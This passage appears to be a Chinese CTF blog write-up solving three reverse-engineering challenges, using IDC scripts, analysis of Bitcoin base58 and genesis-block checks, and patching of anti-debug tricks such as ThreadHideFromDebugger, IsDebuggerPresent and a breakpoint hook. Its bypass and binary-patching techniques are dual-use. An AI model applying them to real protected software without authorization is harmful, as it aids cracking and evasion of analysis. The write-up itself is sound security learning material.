    for(j=0;j<255;j++)
    {
        if(Byte(0x603900+j)==Byte(0x91d5d8+p))
        {
            q = j;
            break;
        }
        //Message("Not Found : %x", Byte(0x603700+p));
    }
    Message("%xt%ct%xn",q , q, v14);
}
```
```
24  $   400dc1  
38  8   400e7a  
43  C   400f3a  
74  t   401064  *  
30  0   4011c9  
45  E   40133d  
75  u   4012f3  *  
23  #   4014b9  
```

得到这8个输入字符即可开始构造了。

由于函数功能很多样，因此构造方法很多，在此仅表述我的构造方法：

由于输入buffer有限，因此不适合向右移动指针太多来找寻合适的字符。所以我就原地变换—毕竟将一个字符变成另一个字符满打满算也只要4个输入，移动指针可就轻而易举几十上百了。

下列计划中push表示将char_table中的值取入m，A->B表示将A通过func_2和3变换成B，->1表示指针后移1位

```
push P    # $
P->B    # t/
pop B    # 8
#111(用于填充make，其实1个就够，懒得算了233)
B->i    # CH
->1        # 0
pop i    # 8
i->n    # C&
->1        # 0
pop n    # 8
->1        # 0
n->g    # t(
pop g    # 8
->1        # 0
pop g    # 8
g->o    # C)
->1        # 0
pop o    # 8
->1        # 0
make x00    # #0
<-6        # uuuuuu
End        # Es
```

![](https://i.loli.net/2019/04/26/5cc2cfb12ec3f.png)

其中的111是为了`make x00`，在指针指向第七个字符时直接构造，提交给服务器即可获得flag。相对而言我觉得这题是所有（re和安卓）题目中质量最高和最（逆向过程中）有趣的~
 

### 被隐藏的真实

这题本来单纯地以为是很简单的题，听欧佳俊师傅讲了一下出题思路才发现他的想法真的比答题人多得多……

main函数里调用了三次get_pwd()这个函数来check输入

get_pwd中接受输入，然后对count自增，调用了Bitcoin对象的一个函数来校验输入

![](https://i.loli.net/2019/04/26/5cc2cfd1468bc.png)

如果熟悉C++逆向的话，一眼就能看出来这是在调用虚函数

因为v2是对象的空间，在C++的对象构造中，开头4个字节指向的是虚函数表

v2指向的是虚函数表，*v2就是虚函数表的第一个函数了

![](https://i.loli.net/2019/04/26/5cc2cfdec47bd.png)

（图片引自C++对象模型详解释https://www.cnblogs.com/tgycoder/p/5426628.html）

做题的时候不是很熟悉C++的模型，以及虚函数反编译的不是很明显，直接动态调试做的。初始状态这个虚函数是init，其中调用了verify，第一次直接返回输入，对应输出列表的需求，要输入0xdeadbeef的小端序表示”efbeadde”。如果纯静态逆向，会继续往下看verify函数的第二、三次校验，但事实上第二次就没有调用init了。

我在做的时候因为不熟悉虚函数，所以动态调试直接跟进函数，发现进入了sub_4046D7这个函数，其中的核心函数b58e乍看起来很复杂，但其实通过其中的24（实际上是256）、%58，和题目内的信息描述很容易想到比特币地址转换方法–base58

直接进行解密获得bytes类型即可通关（注意最后4字节是sha256的验算字节，不可提交，否则会导致flag的sha256计算错误。因为第二关仅截取19个字符送入，但跟flag有关的sha256却会把所有input全部进行运算，导致最后提示Correct实际上的flag却不对）

话是这么说，直接套来的脚本解密出来其实没看懂，还是自己查资料从加密到解密走了一趟才get到应该是hex格式。第三小关本来以为是脑洞题了，其实是误打误撞做出来的，运气是真的好OTZ

这次虚函数又回到了verify，将Input进行两次sha256然后逆序与结果比较，当时的想法是结合提示语：

![](https://i.loli.net/2019/04/26/5cc2cfed5c268.png)

查了一下发现这条地址是中本聪在开始比特币时记录的第一个块–创世块，刚开始想到的是根据创世块向区块链后端爆破，某个区块的sha将会满足要求。不过查了一下好像也没什么适合计算的，总不能自己重复一遍挖矿过程吧233

卡了许久，代码中突然发现一个关键点

![](https://i.loli.net/2019/04/26/5cc2d000497b1.png)

长度80是个很关键的提示！

于是去找了区块链结构解析，发现区块头的长度正好是80个字节
https://webbtc.com/block/000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f.hex

在这里得到了创世块的头部信息，提交即可获得flag

事实上在经过家俊师傅的讲解后，再回头逆才发现这里的memcmp被覆盖到了sub_404A36函数

![](https://i.loli.net/2019/04/26/5cc2d00e50ed7.png)

这个函数中通过异或生成了一个串，然后将输入的字符串与做过两次sha256再逆序的输入进行memcmp。这个两次sha256再逆序的操作，在之前的查资料过程中发现就是比特币的哈希方法，把异或生成的串dump出来去搜索。
```
IDC>auto i;for(i=0;i<80;i++){Message(“%02x”, Byte(0x6d0a00+i));}000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f4e61
```

发现是创世块的哈希值，由此倒推出原输入是创世块。

比赛的时候从一个长度猜到创世块头部，不得不感叹自己的运气真的是……

最后再分析一下虚函数的覆盖，和家俊师傅挖下的种种坑

首先注意到虚函数表中的第一个函数在初始情况下是Init

逐步跟踪，发现Bitcoin在构造函数中就有玄机

![](https://i.loli.net/2019/04/26/5cc2d024ad640.png)

这里跳转到了0x6D0F88处，过去看看

![](https://i.loli.net/2019/04/26/5cc2d02f81779.png)

这时是直接一个leave和retn返回了

但是后面有很多不可识别的脏数据，暂且先放着不管，继续往后走

get_pwd函数中就如之前分析的一样，没什么问题

问题在于析构函数里

![](https://i.loli.net/2019/04/26/5cc2d03a082d7.png)

乍一看好像没什么问题哦，delete释放空间嘛

注意这里的(this+3)指向的就是刚才跳转的0x6D0F88

再点进delete内一看

![](https://i.loli.net/2019/04/26/5cc2d048d5648.png)

？！

跟正常调用free的delete完全不一样，左边function列表中也竟然出现了两个同名的函数

另外一个才是调用free的原delete，这个是冒牌的！

这里利用的是IDA的重命名机制–C++编译器为了区分重载函数，会对函数生成一些其他字符来修饰。delete函数被修饰以后的名称是”_ZdaPv”，但是冒牌delete函数的原名是”__ZdaPv”，IDA同样也会将其重命名为delete，导致被忽视。

这个delete中将参数指向的空间写为0x90，即NOP的机器码

因此可以将刚才的leave、retn和大量脏数据全部写成NOP，从而使下一次调用构造函数的时候可以执行一些其他代码，而这个机密的函数就是脏数据之后的代码，sub_6D1048

![](https://i.loli.net/2019/04/26/5cc2d05310516.png)

这里的a1是rbp，频繁调用的a1-8就是this指针

可以看到，每次调用都会覆盖一次虚函数

另外当第三次执行的时候会将memcmp重写

整个理透以后这个题目学到的应该是最多的，各种阴险技术，真的很有意思23333

可惜做的时候动态跟过去会忽视掉这里的大量重写，比较可惜
 
### 探寻逝去的Atlantis文明

打开文件发现啥都没有

运行杀毒软件提示有代码混淆器

OD挂上各种报错，估计有反调

于是从头分析，首先是两个TlsCallback

TlsCallback_0中第一个函数sub_402B30动态获取了`ZwSetInformationThread`设置当前线程的信息
```
v0 = GetModuleHandleA(&ModuleName);           // Ntdll
  v1 = GetProcAddress(v0, &ProcName);           // ZwSetInformationThread
  v2 = GetCurrentThread();
  return ((int (__stdcall *)(HANDLE, signed int, _DWORD, _DWORD))v1)(v2, 17, 0, 0);//  ThreadHideFromDebugger
```
百度一下可以轻松发现这个函数经常被用来反调试，第17个参数正好就是反调用的：

![](https://i.loli.net/2019/04/26/5cc2d076ccd78.png)

将其首字节改成0xc3，爆破掉即可

后一个函数sub_4028F0同样也是动态获取了4个函数的地址，将它们保存在了一个函数表中留待日后取用。其中一个是IsDebuggerPresent这样的反调函数，另外三个则是VirtualAlloc、VirtualFree和Exit这种有用的函数，因此不可简单Patch

再往后立即就调用了刚才的IsDebuggerPresent，判断到直接Exit

![](https://i.loli.net/2019/04/26/5cc2d081f17b5.png)

这里Patch或者下断过都行，小问题

TlsCallback_1里则是一个MessageBox，无关紧要

接着进入main主函数

![](https://i.loli.net/2019/04/26/5cc2d08d6f3ce.png)

那三个连续的函数不用在意，解密代码很复杂，无需关心

sub_43180里是对Debug断点的Hook

我们知道调试器下断的原理是将某个地址的机器码改为0xcc，使其触发异常，从而被调试器捕捉中断

这个Hook会将0xcc改为0xc3，直接ret，导致不仅调试器捕捉不到断点，而且会直接令程序崩溃

这个函数里除了Hook没有别的东西，直接Patch掉

sub_403010里才是重头戏，通过memcpy将解密后的代码送入开辟出的空间中，然后直接调用

几个函数通过F8步过函数可以大致猜测出功能

![](https://i.loli.net/2019/04/26/5cc2d09789094.png)

关键在change_input和check两个函数中

其实当把那几个反调试通过以后就问题就不大了

动态调试跟进去，发现change_input中将Inputbase64后通过GlobalAddAtom将其加入了全局原子

再往后跟的几个函数都格外的复杂，再加上代码是动态解密的，每次都需要自己MakeCode再F5才能浏览一遍猜测是否需要详细跟踪

事实上在AddAtom之后虽然还有几个函数调用了Input的指针，但它们都是释放空间用的。

这个AddAtom添加了一个全局可用的字符串，必然在某处调用了GlobalGetAtomName

因此不妨稍微忽视一下其他函数，再往后跟

果不其然在v19，即check中捕捉到了GlobalGetAtomName的调用

该函数中生成了一个table，然后将table进行一顿操作后与Input逐字节异或，最后与另一个值进行比较—非常简单粗暴常见的逆向套路了

可以通过dump将table得到，然后效仿操作与结果数组异或从而得到flag

但更简单的方法当然是注意到这两点：

异或的逆运算还是异或

将table进行一顿操作与input完全无关

因此将结果数组直接放入Input的地址中，等到比较的时候，该地址中就是我们需要input的值了

解base64轻松得到flag。
